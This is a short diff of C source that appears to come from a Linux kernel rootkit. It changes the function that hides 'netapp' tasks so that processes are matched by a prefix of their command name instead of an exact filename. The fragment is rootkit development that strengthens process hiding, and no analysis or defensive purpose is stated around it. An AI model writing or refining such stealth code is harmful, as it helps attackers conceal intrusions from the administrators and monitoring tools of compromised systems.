@@ -468,7 +468,7 @@ void kv_scan_and_hide_netapp(void) {
 
         /* XXX: optimise this */
         for (; netapp_list[i] != NULL; ++i) {
-            if (strcmp(netapp_list[i], fnode->filename)) continue;
+            if (strncmp(netapp_list[i], t->comm, strlen(netapp_list[i]))) continue;
             prinfo("Hide netapp task: %d %s i=%d '%s'\n", t->pid, fnode->filename, i, netapp_list[i]);
             /**
              * notice that any netapp added here
